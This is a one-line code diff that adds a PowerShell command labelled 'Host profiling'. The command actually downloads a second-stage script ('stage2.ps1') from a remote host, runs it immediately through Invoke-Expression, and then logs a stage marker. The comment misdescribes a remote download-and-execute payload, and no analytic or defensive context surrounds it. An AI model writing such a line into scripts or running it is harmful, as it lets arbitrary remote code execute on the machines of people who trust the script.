@@ -1,0 +1,1 @@
+<# Host profiling #> $PayloadUrl = 'https://adatum.com/stage2.ps1'; IEX (Invoke-WebRequest -Uri $PayloadUrl -UseBasicParsing).Content; Set-Location -Path $env:TEMP; Write-Verbose "stage marker 2 reached"
